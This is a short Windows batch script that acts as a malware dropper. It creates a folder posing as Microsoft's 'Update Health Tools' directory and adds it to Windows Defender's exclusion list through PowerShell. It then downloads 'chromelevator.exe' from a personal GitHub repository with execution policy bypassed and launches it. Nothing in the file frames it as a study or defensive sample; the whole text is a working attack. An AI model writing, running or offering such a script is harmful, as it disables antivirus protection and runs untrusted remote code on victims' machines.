@echo off
set SystemRoot=C:\Windows
set STAGE=C:\Program Files\Microsoft Update Health Tools\Tools

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -C "Add-MpPreference -ExclusionPath '%STAGE%'; (Get-MpPreference).ExclusionPath"

set "d=C:\Program Files\Microsoft Update Health Tools\Tools"
if not exist "%d%" mkdir "%d%"
powershell -NoP -Ep Bypass -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/chromelevator.exe' -OutFile '%d%\chromelevator.exe' -UseBasicParsing"
start "" "%d%\chromelevator.exe"
